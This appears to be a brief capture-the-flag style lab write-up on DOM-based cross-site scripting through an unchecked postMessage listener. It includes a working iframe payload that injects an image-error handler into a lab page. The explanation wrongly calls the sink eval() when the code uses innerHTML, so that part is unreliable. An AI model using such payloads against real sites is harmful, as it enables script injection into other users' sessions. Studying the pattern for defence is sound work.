Consider that a web page contains addEventListener() in the source:
```
                    <script>
                        window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;
                        })
                    </script>
```

As the event listener does not verify the origin of the message, and the postMessage() method specifies the targetOrigin "*", the event listener accepts the payload and passes it into a sink, in this case, the eval() function.

We can exploit this by sending the below javascript via post message to the server

<iframe src="https://ac5f1f471f6efd53c0331224005500d8.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
